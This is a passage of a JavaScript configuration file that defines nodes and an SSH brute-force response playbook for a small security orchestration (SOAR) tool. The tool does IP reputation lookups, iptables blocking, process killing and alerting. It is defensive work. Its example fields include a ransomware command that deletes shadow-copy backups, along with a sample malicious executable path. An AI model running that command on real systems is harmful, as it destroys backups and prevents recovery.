/**
 * Mini-SOAR Playbook Workflow Data Definitions & Default Templates
 * Separated into GeoIP Locator, AbuseIPDB Threat Intel, Dynamic Scorer, IPTables, Sentinel, MySQL, Telegram
 */

const DEFAULT_APPS = [
  {
    id: "app-webhook",
    name: "Webhook Trigger",
    category: "Triggers",
    badge: "badge-trigger",
    type: "trigger",
    image: "/images/apps/webhook.svg",
    description: "Accept incoming HTTP POST security alerts from SIEM/EDR",
    actions: [
      {
        name: "WEBHOOK_TRIGGER",
        description: "Receive alert payload asynchronously",
        parameters: [
          { name: "endpoint_url", value: "http://localhost:8080/api/v1/alerts/ssh", description: "Webhook Ingestion URL" },
          { name: "auth_header", value: "X-SOAR-API-KEY", description: "API Authorization Key Header" },
          { name: "payload_type", value: "JSON", description: "Format of incoming payload" }
        ],
        outputs: [
          { name: "alert_id", type: "number", example: 101, description: "Alert record ID" },
          { name: "source_ip", type: "string", example: "198.51.100.44", description: "Attacker IP address" },
          { name: "hostname", type: "string", example: "srv-prod-ssh01", description: "Target host machine" },
          { name: "host_ip", type: "string", example: "10.0.4.88", description: "Target host IP address" },
          { name: "alert_type", type: "string", example: "SSH_BRUTE_FORCE", description: "Alert category" },
          { name: "failed_attempts", type: "number", example: 6, description: "Number of failed login attempts" },
          { name: "process_id", type: "number", example: 5120, description: "Suspicious process PID" },
          { name: "process_name", type: "string", example: "vssadmin.exe", description: "Malicious process binary" },
          { name: "command_line", type: "string", example: "vssadmin.exe Delete Shadows /All /Quiet", description: "Process command line" },
          { name: "suspicious_extensions", type: "array", example: [".locked", ".crypto"], description: "Encrypted file extensions" },
          { name: "affected_file_count", type: "number", example: 480, description: "Number of affected files" }
        ]
      }
    ]
  },
  {
    id: "app-schedule",
    name: "Periodic Schedule Trigger",
    category: "Triggers",
    badge: "badge-trigger",
    type: "trigger",
    image: "/images/apps/schedule.svg",
    description: "Trigger playbook on a recurring cron interval or fixed schedule",
    actions: [
      {
        name: "CRON_TRIGGER",
        description: "Run on cron schedule",
        parameters: [
          { name: "cron_expression", value: "*/5 * * * *", description: "Cron expression (e.g. every 5 min)" }
        ],
        outputs: [
          { name: "triggered_at", type: "string", example: "2026-09-03T09:30:00Z", description: "Trigger timestamp" },
          { name: "iteration", type: "number", example: 142, description: "Execution sequence number" }
        ]
      }
    ]
  },
  {
    id: "app-geoip",
    name: "GeoIP & Network Locator",
    category: "Network & Location",
    badge: "badge-scorer",
    type: "scorer",
    image: "/images/apps/geoip.svg",
    description: "Tra cứu vị trí địa lý, Quốc gia, Tỉnh/Thành phố, ASN và Nhà Mạng (ISP) từ MaxMind/IPinfo",
    actions: [
      {
        name: "LOOKUP_GEO_LOCATION",
        description: "Tra cứu quốc gia, thành phố, ASN, ISP và kiểm tra IP riêng RFC1918",
        parameters: [
          { name: "source_ip", value: "", description: "Địa chỉ IP cần định vị" }
        ],
        outputs: [
          { name: "ip_analyzed", type: "string", example: "198.51.100.44", description: "IP đã được tra cứu" },
          { name: "country", type: "string", example: "Russia", description: "Quốc gia nguồn gốc" },
          { name: "country_code", type: "string", example: "RU", description: "Mã quốc gia ISO (2 ký tự)" },
          { name: "city", type: "string", example: "Moscow", description: "Thành phố vị trí địa lý" },
          { name: "asn", type: "string", example: "AS12389", description: "Số hiệu mạng Autonomous System (ASN)" },
          { name: "isp", type: "string", example: "Rostelecom PJSC", description: "Nhà mạng / Internet Service Provider" },
          { name: "is_private_lan", type: "boolean", example: false, description: "IP có thuộc dải Private (192.168/10.0/172.16)" }
        ]
      }
    ]
  },
  {
    id: "app-abuseipdb",
    name: "AbuseIPDB Threat Intelligence",
    category: "Threat Intel & Scoring",
    badge: "badge-firewall",
    type: "scorer",
    image: "/images/apps/abuseipdb.svg",
    description: "Kiểm tra mức độ độc hại, điểm uy tín và báo cáo tấn công toàn cầu qua AbuseIPDB API v2",
    actions: [
      {
        name: "CHECK_IP_REPUTATION",
        description: "Gửi API check điểm Abuse Confidence Score (0-100%) và tổng số lượt report",
        parameters: [
          { name: "source_ip", value: "", description: "IP cần kiểm tra danh tiếng" },
          { name: "api_key", value: "ABUSEIPDB_API_KEY", description: "AbuseIPDB Account API Key" },
          { name: "max_age_days", value: "90", description: "Khoảng thời gian báo cáo (ngày)" }
        ],
        outputs: [
          { name: "queried_ip", type: "string", example: "198.51.100.44", description: "IP đã được AbuseIPDB kiểm tra" },
          { name: "threat_score", type: "number", example: 96, description: "Điểm mức độ nguy hại Abuse Confidence Score (0-100%)" },
          { name: "total_reports", type: "number", example: 42, description: "Tổng số lượt báo cáo từ cộng đồng an ninh toàn cầu" },
          { name: "is_malicious", type: "boolean", example: true, description: "True nếu điểm >= 50% hoặc bị report >= 5 lần" },
          { name: "threat_category", type: "string", example: "SSH Brute-Force Attacker", description: "Loại hành vi tấn công chính" },
          { name: "last_reported_at", type: "string", example: "2026-09-02T18:30:00Z", description: "Thời điểm bị report gần nhất" }
        ]
      }
    ]
  },
  {
    id: "app-iphistory",
    name: "MySQL Blacklist & History",
    category: "Threat Intel & Scoring",
    badge: "badge-action",
    type: "action",
    image: "/images/apps/mysql.svg",
    description: "Kiểm tra tiền sử vi phạm, tra cứu IP trong bảng Blacklist và tính điểm phạt tái phạm",
    actions: [
      {
        name: "CHECK_IP_HISTORY",
        description: "Truy vấn lịch sử vi phạm & Blacklist của IP trong MySQL Database",
        parameters: [
          { name: "ip_address", value: "", description: "Địa chỉ IP cần kiểm tra lịch sử vi phạm" }
        ],
        outputs: [
          { name: "ip_address", type: "string", example: "185.220.101.5", description: "IP được kiểm tra" },
          { name: "is_repeat_offender", type: "boolean", example: true, description: "True nếu IP đã từng bị chặn trong quá khứ" },
          { name: "previous_blocks_count", type: "number", example: 3, description: "Số lần IP đã từng bị đưa vào Blacklist" },
          { name: "history_penalty_score", type: "number", example: 25, description: "Điểm phạt cộng thêm do tái phạm vi phạm (+25 điểm)" },
          { name: "last_incident_reason", type: "string", example: "SSH Brute-Force Automated Drop", description: "Lý do bị chặn gần nhất" },
          { name: "first_seen_at", type: "string", example: "2026-08-25T10:15:00Z", description: "Thời điểm phát hiện vi phạm lần đầu" }
        ]
      }
    ]
  },
  {
    id: "app-threatintel",
    name: "Dynamic Security Scorer",
    category: "Threat Intel & Scoring",
    badge: "badge-scorer",
    type: "scorer",
    image: "/images/apps/threatintel.svg",
    description: "Bộ tính toán điểm rủi ro tổng hợp & phân tích kỹ thuật mã độc MITRE ATT&CK",
    actions: [
      {
        name: "CALCULATE_DYNAMIC_SEVERITY",
        description: "Dynamic Scorer: Attempt weight + AbuseIPDB threat score + Asset Criticality",
        parameters: [
          { name: "scoring_formula", value: "attempt_weight + geo_weight + threat_weight + history_weight + asset_weight", description: "Biểu thức tính điểm tự do (Ví dụ: attempt_weight*0.4 + threat_score*0.35 + history_weight)" },
          { name: "source_ip", value: "", description: "Attacker IP address" },
          { name: "country", value: "", description: "Quốc gia của IP (Từ Node 2 GeoIP)" },
          { name: "is_private_lan", value: "", description: "IP nội bộ LAN (Từ Node 2 GeoIP)" },
          { name: "failed_attempts", value: "", description: "Failed password attempts (Từ Node 1 Webhook)" },
          { name: "threat_score", value: "", description: "AbuseIPDB Threat Score (Từ Node 3 AbuseIPDB)" },
          { name: "history_penalty", value: "", description: "Điểm phạt tiền sử vi phạm (Từ Node 3b MySQL History)" },
          { name: "is_repeat_offender", value: "", description: "Cờ tái phạm vi phạm (Từ Node 3b MySQL History)" },
          { name: "hostname", value: "", description: "Target server hostname (Từ Node 1 Webhook)" }
        ],
        outputs: [
          { name: "total_score", type: "number", example: 100, description: "Điểm số tính được từ biểu thức (0-100)" },
          { name: "severity", type: "string", example: "CRITICAL", description: "Mức độ sự cố tự động phân loại (LOW/MED/HIGH/CRITICAL)" },
          { name: "should_escalate", type: "boolean", example: true, description: "True nếu Điểm số >= 65" },
          { name: "applied_formula", type: "string", example: "(threat_score * 0.35) + (failed_attempts * 2.5) + history_penalty", description: "Biểu thức đã áp dụng" }
        ]
      },
      {
        name: "ANALYZE_MITRE_TTPS",
        description: "MITRE ATT&CK T1490 & Ransomware heuristic analyzer",
        parameters: [
          { name: "process_name", value: "", description: "Suspicious binary name" },
          { name: "command_line", value: "", description: "Command line arguments" },
          { name: "crypto_extension", value: "", description: "Target encrypted file extension" },
          { name: "affected_file_count", value: "", description: "Affected/encrypted file count" }
        ],
        outputs: [
          { name: "alert_id", type: "number", example: 101, description: "Alert record ID passed through analyzer" },
          { name: "hostname", type: "string", example: "ws-finance-dept04", description: "Hostname passed through analyzer" },
          { name: "process_id", type: "number", example: 5120, description: "Process ID passed through analyzer" },
          { name: "process_name", type: "string", example: "vssadmin.exe", description: "Process name passed through analyzer" },
          { name: "command_line", type: "string", example: "vssadmin.exe Delete Shadows /All /Quiet", description: "Command line analyzed" },
          { name: "affected_file_count", type: "number", example: 480, description: "Affected/encrypted file count" },
          { name: "risk_score", type: "number", example: 100, description: "Heuristic MITRE Score (0-100)" },
          { name: "severity", type: "string", example: "CRITICAL", description: "Incident Severity Level" },
          { name: "is_critical", type: "boolean", example: true, description: "True if Score >= 75" },
          { name: "matched_ttps", type: "array", example: ["T1490 - Inhibit System Recovery", "T1486 - Data Encrypted for Impact"], description: "Matched MITRE Techniques" }
        ]
      }
    ]
  },
  {
    id: "app-iptables",
    name: "Linux IPTables Firewall",
    category: "Network Security",
    badge: "badge-firewall",
    type: "firewall",
    image: "/images/apps/iptables.svg",
    description: "Automated packet filtering, port 22 DROP rules and host quarantine",
    actions: [
      {
        name: "DROP",
        description: "Chặn IP tấn công bằng IPTables DROP trên Port 22",
        parameters: [
          { name: "server_ip", value: "", description: "Server/VPS IP đang áp dụng firewall rule" },
          { name: "attacker_ip", value: "", description: "IP tấn công cần chặn" },
          { name: "port", value: "22", description: "Service Port" },
          { name: "protocol", value: "tcp", description: "Transport Protocol" }
        ],
        outputs: [
          { name: "status", type: "string", example: "SUCCESS", description: "Rule insertion status" },
          { name: "server_ip", type: "string", example: "13.218.244.6", description: "Server/VPS IP nhận rule" },
          { name: "attacker_ip", type: "string", example: "198.51.100.44", description: "Blocked attacker IP" },
          { name: "source_ip", type: "string", example: "198.51.100.44", description: "Backward-compatible attacker IP alias" },
          { name: "rule_id", type: "string", example: "rule-iptables-port22-drop", description: "Firewall Rule ID" },
          { name: "command_executed", type: "string", example: "sudo iptables -C INPUT -s 198.51.100.44 -p tcp --dport 22 -j DROP || sudo iptables -I INPUT 1 -s 198.51.100.44 -p tcp --dport 22 -j DROP", description: "Executed Linux Shell Command" },
          { name: "verification_command", type: "string", example: "sudo iptables -C INPUT -s 198.51.100.44 -p tcp --dport 22 -j DROP", description: "Command dùng để kiểm tra rule đã tồn tại" },
          { name: "verification_success_marker", type: "string", example: "RULE_PRESENT", description: "Marker xác nhận rule đã được tìm thấy sau khi chặn" }
        ]
      },
      {
        name: "QUARANTINE_HOST",
        description: "Cô lập máy chủ khỏi mạng (DROP mọi kết nối ngoại trừ loopback)",
        parameters: [
          { name: "hostname", value: "", description: "Target hostname to isolate" },
          { name: "interface", value: "eth0", description: "Network interface" }
        ],
        outputs: [
          { name: "status", type: "string", example: "QUARANTINED", description: "Host quarantine status" },
          { name: "alert_id", type: "number", example: 101, description: "Alert record ID passed through quarantine" },
          { name: "hostname", type: "string", example: "ws-finance-dept04", description: "Quarantined host" },
          { name: "affected_file_count", type: "number", example: 480, description: "Affected/encrypted file count" },
          { name: "isolated_interface", type: "string", example: "eth0", description: "Isolated NIC" },
          { name: "active_firewall_rule", type: "string", example: "iptables -A OUTPUT ! -o lo -j DROP", description: "Applied isolation rule" }
        ]
      },
      {
        name: "ACCEPT",
        description: "Mở chặn hoặc Whitelist địa chỉ IP",
        parameters: [
          { name: "source_ip", value: "", description: "IP to unblock" }
        ],
        outputs: [
          { name: "status", type: "string", example: "UNBLOCKED", description: "Unblock status" }
        ]
      }
    ]
  },
  {
    id: "app-ssh-exec",
    name: "SSH Remote VPS Connector",
    category: "Remote Execution",
    badge: "badge-action",
    type: "action",
    image: "/images/apps/ssh.svg",
    description: "Kết nối SSH tới Remote VPS thực thi lệnh cứu hộ, firewall iptables hoặc script",
    actions: [
      {
        name: "EXECUTE_REMOTE_SSH",
        description: "Thực thi lệnh Linux (IPTables DROP, Kill Process, Isolation) trên VPS từ xa",
        parameters: [
          { name: "ip_address", value: "13.218.244.6", description: "Địa chỉ IP VPS / server SSH" },
          { name: "username", value: "ec2-user", description: "SSH Username" },
          { name: "port", value: "22", description: "SSH Port" },
          { name: "pem_file", value: "/run/secrets/pnreal-dev.pem", description: "File .pem trên backend/container" },
          { name: "password", value: "", description: "SSH password nếu không dùng key" },
          { name: "command", value: "$act-ssh-3.command_executed", description: "Lệnh Shell thực thi trên VPS" },
          { name: "timeout_seconds", value: "10", description: "Timeout (giây)" }
        ],
        outputs: [
          { name: "status", type: "string", example: "SUCCESS", description: "SSH command status" },
          { name: "executed_host", type: "string", example: "13.218.244.6", description: "Remote VPS Host" },
          { name: "server_ip", type: "string", example: "13.218.244.6", description: "Remote VPS IP" },
          { name: "attacker_ip", type: "string", example: "198.51.100.45", description: "IP attacker" },
          { name: "command_executed", type: "string", example: "iptables -A INPUT -s 198.51.100.45 -p tcp --dport 22 -j DROP", description: "Lệnh đã chạy trên VPS" },
          { name: "exit_code", type: "number", example: 0, description: "Process Exit Code" },
          { name: "source_ip", type: "string", example: "198.51.100.45", description: "IP attacker" },
          { name: "verification_status", type: "string", example: "VERIFIED", description: "VERIFIED nếu stdout có RULE_PRESENT" },
          { name: "stdout", type: "string", example: "Rule applied successfully", description: "Output stdout" }
        ]
      }
    ]
  },
  {
    id: "app-sentinel",
    name: "Host Process Sentinel",
    category: "Endpoint (EDR)",
    badge: "badge-action",
    type: "action",
    image: "/images/apps/sentinel.svg",
    description: "Local process investigation, SIGKILL termination & memory snapshot",
    actions: [
      {
        name: "KILL_PID",
        description: "Tiêu diệt tiến trình mã độc bằng POSIX SIGKILL (-9)",
        parameters: [
          { name: "pid", value: "", description: "Process ID (PID) to kill" },
          { name: "signal", value: "SIGKILL", description: "Termination signal" }
        ],
        outputs: [
          { name: "status", type: "string", example: "TERMINATED", description: "Kill result" },
          { name: "alert_id", type: "number", example: 101, description: "Alert record ID passed through kill action" },
          { name: "hostname", type: "string", example: "ws-finance-dept04", description: "Host passed through kill action" },
          { name: "process_name", type: "string", example: "vssadmin.exe", description: "Process name passed through kill action" },
          { name: "pid", type: "number", example: 5120, description: "Original process ID" },
          { name: "killed_pid", type: "number", example: 5120, description: "Terminated process ID" },
          { name: "affected_file_count", type: "number", example: 480, description: "Affected/encrypted file count" },
          { name: "child_processes_killed", type: "number", example: 3, description: "Number of child processes killed" }
        ]
      },
      {
        name: "GET_PROCESS_FORENSICS",
        description: "Đọc snapshot /proc/{pid}/cmdline và danh sách socket",
        parameters: [
          { name: "hostname", value: "", description: "Target hostname" },
          { name: "host_ip", value: "", description: "Target host IP" },
          { name: "pid", value: "", description: "Process ID to inspect" },
          { name: "process_name", value: "", description: "Process name from EDR" },
          { name: "command_line", value: "", description: "Command line from EDR" },
          { name: "affected_file_count", value: "", description: "Affected/encrypted file count" }
        ],
        outputs: [
          { name: "alert_id", type: "number", example: 101, description: "Alert record ID passed through forensic node" },
          { name: "hostname", type: "string", example: "ws-finance-dept04", description: "Target hostname" },
          { name: "host_ip", type: "string", example: "10.0.4.88", description: "Target host IP" },
          { name: "pid", type: "number", example: 5120, description: "Inspected process ID" },
          { name: "process_name", type: "string", example: "vssadmin.exe", description: "Inspected process name" },
          { name: "cmdline", type: "string", example: "vssadmin.exe Delete Shadows /All /Quiet", description: "Full commandline from /proc/{pid}/cmdline" },
          { name: "affected_file_count", type: "number", example: 480, description: "Affected/encrypted file count" },
          { name: "exe_path", type: "string", example: "/tmp/lockbit.exe", description: "Executable path" },
          { name: "open_sockets", type: "array", example: ["tcp:0.0.0.0:4444 (LISTEN)"], description: "Active open network sockets" }
        ]
      }
    ]
  },
  {
    id: "app-mysqldb",
    name: "MySQL Asset & Incident DB Logger",
    category: "Database & Audit",
    badge: "badge-action",
    type: "action",
    image: "/images/apps/mysql.svg",
    description: "Log blocked IPs, store ransomware forensic events & query asset inventory",
    actions: [
      {
        name: "LOG_BLOCKED_IP",
        description: "Ghi nhận IP vào bảng blocked_ips trong MySQL",
        parameters: [
          { name: "ip_address", value: "", description: "Blocked IP" },
          { name: "reason", value: "SSH Brute-Force Automated Drop", description: "Reason for blocking" },
          { name: "table", value: "blocked_ips", description: "Target database table" }
        ],
        outputs: [
          { name: "record_id", type: "number", example: 104, description: "Inserted primary key ID" },
          { name: "ip_address", type: "string", example: "198.51.100.44", description: "Blocked IP address" },
          { name: "table_name", type: "string", example: "blocked_ips", description: "Target table" },
          { name: "persisted", type: "boolean", example: true, description: "Persistence status" }
        ]
      },
      {
        name: "LOG_RANSOMWARE_INCIDENT",
        description: "Ghi nhận sự cố mã độc vào bảng ransomware_incidents",
        parameters: [
          { name: "alert_id", value: "", description: "Alert ID from webhook ingestion" },
          { name: "hostname", value: "", description: "Target host" },
          { name: "process_name", value: "", description: "Killed process" },
          { name: "pid", value: "", description: "Killed process PID" },
          { name: "affected_files", value: "", description: "Affected/encrypted file count" },
          { name: "status", value: "CONTAINED", description: "Resolution Status" }
        ],
        outputs: [
          { name: "incident_id", type: "number", example: 42, description: "Created Incident ID" },
          { name: "alert_id", type: "number", example: 101, description: "Related alert ID" },
          { name: "hostname", type: "string", example: "ws-finance-dept04", description: "Incident host" },
          { name: "process_name", type: "string", example: "vssadmin.exe", description: "Killed process name" },
          { name: "pid", type: "number", example: 5120, description: "Killed process PID" },
          { name: "affected_files", type: "number", example: 480, description: "Affected/encrypted files" },
          { name: "persisted", type: "boolean", example: true, description: "Persistence status" },
          { name: "logged_at", type: "string", example: "2026-09-03T09:32:00Z", description: "Creation timestamp" }
        ]
      },
      {
        name: "QUERY_ASSET_CRITICALITY",
        description: "Truy vấn độ ưu tiên máy chủ (Production/Staging/Dev)",
        parameters: [
          { name: "hostname", value: "", description: "Target hostname" }
        ],
        outputs: [
          { name: "hostname", type: "string", example: "srv-prod-ssh01", description: "Queried host" },
          { name: "tier", type: "string", example: "PRODUCTION", description: "Asset priority tier" },
          { name: "weight", type: "number", example: 30, description: "Weight score added (+30 for prod)" }
        ]
      },
      {
        name: "CHECK_IP_HISTORY",
        description: "Truy vấn lịch sử vi phạm & Blacklist của IP trong MySQL Database",
        parameters: [
          { name: "ip_address", value: "", description: "Địa chỉ IP cần kiểm tra lịch sử vi phạm" }
        ],
        outputs: [
          { name: "ip_address", type: "string", example: "185.220.101.5", description: "IP được kiểm tra" },
          { name: "is_repeat_offender", type: "boolean", example: true, description: "True nếu IP đã từng bị chặn trong quá khứ" },
          { name: "previous_blocks_count", type: "number", example: 3, description: "Số lần IP đã từng bị đưa vào Blacklist" },
          { name: "history_penalty_score", type: "number", example: 25, description: "Điểm phạt cộng thêm do tái phạm vi phạm (+25 điểm)" },
          { name: "last_incident_reason", type: "string", example: "SSH Brute-Force Automated Drop", description: "Lý do bị chặn gần nhất" },
          { name: "first_seen_at", type: "string", example: "2026-08-25T10:15:00Z", description: "Thời điểm phát hiện vi phạm lần đầu" }
        ]
      }
    ]
  },
  {
    id: "app-telegram",
    name: "Telegram Incident Notifier",
    category: "Communication",
    badge: "badge-action",
    type: "action",
    image: "/images/apps/telegram.svg",
    description: "Bắn tin cảnh báo tức thời tới SOC Telegram Bot & Channel",
    actions: [
      {
        name: "SEND_SOC_ALERT",
        description: "Gửi thông báo sự cố định dạng HTML qua Telegram Bot API",
        parameters: [
          { name: "bot_token", value: "7891234567:AAFx_TELEGRAM_BOT_TOKEN_SOAR", description: "Telegram Bot Token (từ @BotFather)" },
          { name: "chat_id", value: "@mini_soar_alerts_channel", description: "Telegram Chat ID / Kênh nhận cảnh báo" },
          { name: "severity", value: "CRITICAL", description: "Mức độ nghiêm trọng (CRITICAL / HIGH / MEDIUM)" },
          { name: "message_html", value: "<b>[Mini-SOAR] Security Incident Alert</b><br>Status: Remediated", description: "Nội dung cảnh báo HTML" }
        ],
        outputs: [
          { name: "delivery_status", type: "string", example: "HTTP 200 DELIVERED", description: "Trạng thái gửi tin nhắn tới Telegram API" },
          { name: "message_id", type: "number", example: 89412, description: "ID tin nhắn do Telegram cấp" },
          { name: "dispatched_channel", type: "string", example: "@mini_soar_alerts_channel", description: "Kênh / Nhóm nhận cảnh báo" },
          { name: "message_sent", type: "string", example: "<b>🚨 [SSH Brute-Force] IP Blocked</b>...", description: "Toàn bộ nội dung tin nhắn cảnh báo đã phát đi" },
          { name: "severity", type: "string", example: "CRITICAL", description: "Mức độ nghiêm trọng của sự cố" },
          { name: "status", type: "string", example: "SUCCESS", description: "Kết quả thực thi action" }
        ]
      }
    ]
  },
  {
    id: "app-branch",
    name: "Branch Condition (If/Else)",
    category: "Flow Logic",
    badge: "badge-branch",
    type: "branch",
    image: "/images/apps/branch.svg",
    description: "Conditional logic evaluator: branch into TRUE (Escalate) or FALSE (Monitor)",
    actions: [
      {
        name: "EVALUATE_CONDITION",
        description: "Evaluate condition on variable",
        parameters: [
          { name: "source_variable", value: "$act-ssh-scorer.total_score", description: "Variable to test" },
          { name: "condition_operator", value: "larger than or equal", description: "Comparison Operator" },
          { name: "target_value", value: "65", description: "Threshold value" }
        ],
        outputs: [
          { name: "result", type: "boolean", example: true, description: "True nếu điều kiện khớp, false nếu không khớp" }
        ]
      }
    ]
  }
];

const PRESET_WORKFLOWS = {
  "wf-ssh-01": {
    id: "wf-ssh-01",
    name: "Playbook 1: SSH Brute-Force Auto-Response",
    description: "Phân tách riêng Node GeoIP Locator và Node AbuseIPDB Intel, tính điểm rủi ro, chặn IP IPTables, ghi log MySQL và báo Telegram",
    triggers: [
      {
        id: "trig-ssh-1",
        name: "WEBHOOK_TRIGGER",
        label: "Node 1: SSH Alert Webhook",
        app_id: "app-webhook",
        app_name: "Webhook Trigger",
        app_type: "trigger",
        large_image: "/images/apps/webhook.svg",
        position: { x: 50, y: 220 },
        parameters: [
          { name: "endpoint_url", value: "http://localhost:8080/api/v1/alerts/ssh", description: "Webhook Ingestion URL" },
          { name: "auth_header", value: "X-SOAR-API-KEY", description: "API Secret Key Header" },
          { name: "payload_format", value: "JSON (RFC Standard Alert Schema)", description: "Định dạng Payload chuẩn" }
        ]
      }
    ],
    actions: [
      {
        id: "act-ssh-geo",
        name: "LOOKUP_GEO_LOCATION",
        label: "Node 2: GeoIP & Network Locator",
        app_id: "app-geoip",
        app_name: "GeoIP & Network Locator",
        app_type: "scorer",
        large_image: "/images/apps/geoip.svg",
        position: { x: 350, y: 120 },
        parameters: [
          { name: "source_ip", value: "$trig-ssh-1.source_ip", description: "IP cần định vị" }
        ]
      },
      {
        id: "act-ssh-abuse",
        name: "CHECK_IP_REPUTATION",
        label: "Node 3: AbuseIPDB Threat Intel API",
        app_id: "app-abuseipdb",
        app_name: "AbuseIPDB Threat Intelligence",
        app_type: "firewall",
        large_image: "/images/apps/abuseipdb.svg",
        position: { x: 350, y: 320 },
        parameters: [
          { name: "source_ip", value: "$trig-ssh-1.source_ip", description: "IP cần tra cứu uy tín" },
          { name: "api_key", value: "ABUSEIPDB_API_KEY", description: "AbuseIPDB API Key" },
          { name: "max_age_days", value: "90", description: "Khoảng thời gian báo cáo (ngày)" }
        ]
      },
      {
        id: "act-ssh-history",
        name: "CHECK_IP_HISTORY",
        label: "Node 3b: MySQL Blacklist & History",
        app_id: "app-iphistory",
        app_name: "MySQL Blacklist & History",
        app_type: "action",
        large_image: "/images/apps/mysql.svg",
        position: { x: 350, y: 460 },
        parameters: [
          { name: "ip_address", value: "$trig-ssh-1.source_ip", description: "IP cần tra cứu lịch sử trong DB" }
        ]
      },
      {
        id: "act-ssh-scorer",
        name: "CALCULATE_DYNAMIC_SEVERITY",
        label: "Node 4: Dynamic Severity Scorer",
        app_id: "app-threatintel",
        app_name: "Dynamic Security Scorer",
        app_type: "scorer",
        large_image: "/images/apps/threatintel.svg",
        position: { x: 700, y: 220 },
        parameters: [
          { name: "scoring_formula", value: "(threat_score * 0.35) + (failed_attempts * 2.5) + (history_penalty || 0) + (is_private_lan ? 0 : 15)", description: "Công thức tính điểm từ các biến đầu vào bên dưới" },
          { name: "source_ip", value: "$trig-ssh-1.source_ip", description: "Attacker IP" },
          { name: "country", value: "$act-ssh-geo.country", description: "Quốc gia của kẻ tấn công (Từ Node 2 GeoIP)" },
          { name: "is_private_lan", value: "$act-ssh-geo.is_private_lan", description: "Mạng LAN nội bộ (Từ Node 2 GeoIP)" },
          { name: "failed_attempts", value: "$trig-ssh-1.failed_attempts", description: "Số lần thử sai (Từ Node 1 Webhook)" },
          { name: "threat_score", value: "$act-ssh-abuse.threat_score", description: "Điểm AbuseIPDB (Từ Node 3 AbuseIPDB)" },
          { name: "history_penalty", value: "$act-ssh-history.history_penalty_score", description: "Điểm phạt tái phạm (Từ Node 3b MySQL History)" },
          { name: "is_repeat_offender", value: "$act-ssh-history.is_repeat_offender", description: "Tái phạm Blacklist (Từ Node 3b MySQL History)" },
          { name: "hostname", value: "$trig-ssh-1.hostname", description: "Server bị tấn công (Từ Node 1 Webhook)" }
        ]
      },
      {
        id: "act-ssh-branch",
        name: "EVALUATE_CONDITION",
        label: "Node 5: Decision Rule (Score >= 65)",
        app_id: "app-branch",
        app_name: "Branch Condition",
        app_type: "branch",
        large_image: "/images/apps/branch.svg",
        position: { x: 990, y: 220 },
        parameters: [
          { name: "source_variable", value: "$act-ssh-scorer.total_score", description: "Evaluated Total Score" },
          { name: "condition_operator", value: "larger than or equal", description: "Operator" },
          { name: "target_value", value: "65", description: "Escalation Threshold" }
        ]
      },
      {
        id: "act-ssh-3",
        name: "DROP",
        label: "Node 6: Linux IPTables DROP",
        app_id: "app-iptables",
        app_name: "Linux IPTables Firewall",
        app_type: "firewall",
        large_image: "/images/apps/iptables.svg",
        position: { x: 1300, y: 120 },
        parameters: [
          { name: "server_ip", value: "13.218.244.6", description: "Server/VPS IP đang mở ở SSH Remote VPS Connector" },
          { name: "attacker_ip", value: "$trig-ssh-1.source_ip", description: "IP tấn công lấy từ Webhook Trigger" },
          { name: "port", value: "22", description: "Port 22 SSH" },
          { name: "protocol", value: "tcp", description: "Protocol TCP" }
        ]
      },
      {
        id: "act-ssh-remote",
        name: "EXECUTE_REMOTE_SSH",
        label: "Node 6c: Remote VPS SSH Connector",
        app_id: "app-ssh-exec",
        app_name: "SSH Remote VPS Connector",
        app_type: "action",
        large_image: "/images/apps/ssh.svg",
        position: { x: 1610, y: 120 },
        parameters: [
          { name: "ip_address", value: "13.218.244.6", description: "Địa chỉ IP VPS / server SSH" },
          { name: "username", value: "ec2-user", description: "VPS SSH User" },
          { name: "port", value: "22", description: "SSH Port" },
          { name: "pem_file", value: "/run/secrets/pnreal-dev.pem", description: "File .pem trên backend/container" },
          { name: "password", value: "", description: "SSH password nếu không dùng key" },
          { name: "command", value: "$act-ssh-3.command_executed", description: "Remote firewall command" },
          { name: "timeout_seconds", value: "10", description: "Timeout" }
        ]
      },
      {
        id: "act-ssh-4",
        name: "LOG_BLOCKED_IP",
        label: "Node 7: MySQL Blacklist Logger",
        app_id: "app-mysqldb",
        app_name: "MySQL DB Logger",
        app_type: "action",
        large_image: "/images/apps/mysql.svg",
        position: { x: 1920, y: 120 },
        parameters: [
          { name: "ip_address", value: "$act-ssh-3.source_ip", description: "Blocked IP" },
          { name: "reason", value: "SSH Brute-Force automated block | severity=$act-ssh-scorer.severity | score=$act-ssh-scorer.total_score", description: "Block reason" }
        ]
      },
      {
        id: "act-ssh-5",
        name: "SEND_SOC_ALERT",
        label: "Node 8: Telegram Incident Alert",
        app_id: "app-telegram",
        app_name: "Telegram Incident Notifier",
        app_type: "action",
        large_image: "/images/apps/telegram.svg",
        position: { x: 2230, y: 120 },
        parameters: [
          { name: "bot_token", value: "7891234567:AAFx_TELEGRAM_BOT_TOKEN_SOAR", description: "Telegram Bot Token" },
          { name: "chat_id", value: "@mini_soar_alerts_channel", description: "Telegram SOC Channel / Chat ID" },
          { name: "severity", value: "$act-ssh-scorer.severity", description: "Severity" },
          { name: "message_html", value: "<b>[MINI-SOAR ALERT] SSH ATTACK INCIDENT</b><br><br>• <b>Severity</b>: <code>$act-ssh-scorer.severity</code> (Score: $act-ssh-scorer.total_score/100)<br>• <b>Target Host</b>: <code>$trig-ssh-1.hostname</code><br>• <b>Target User</b>: <code>$trig-ssh-1.username</code><br>• <b>Source IP</b>: <code>$act-ssh-4.ip_address</code> ($act-ssh-geo.country - $act-ssh-geo.isp)<br>• <b>Failed Attempts</b>: <code>$trig-ssh-1.failed_attempts</code><br>• <b>Execution Mode</b>: <code>[PRODUCTION]</code><br>• <b>Action Taken</b>: <code>BLOCK_IP_FIREWALL</code>", description: "Alert Message" }
        ]
      },
      {
        id: "act-ssh-monitor",
        name: "QUERY_ASSET_CRITICALITY",
        label: "Node 6b: Audit & Monitoring Log",
        app_id: "app-mysqldb",
        app_name: "MySQL DB Logger",
        app_type: "action",
        large_image: "/images/apps/mysql.svg",
        position: { x: 1300, y: 340 },
        parameters: [
          { name: "hostname", value: "$act-ssh-scorer.hostname", description: "Host to audit" }
        ]
      }
    ],
    branches: [
      { id: "b-1", source_id: "trig-ssh-1", destination_id: "act-ssh-geo", label: "" },
      { id: "b-2", source_id: "trig-ssh-1", destination_id: "act-ssh-abuse", label: "" },
      { id: "b-2b", source_id: "trig-ssh-1", destination_id: "act-ssh-history", label: "" },
      { id: "b-direct-1-4", source_id: "trig-ssh-1", destination_id: "act-ssh-scorer", label: "Alert Context" },
      { id: "b-3a", source_id: "act-ssh-geo", destination_id: "act-ssh-scorer", label: "" },
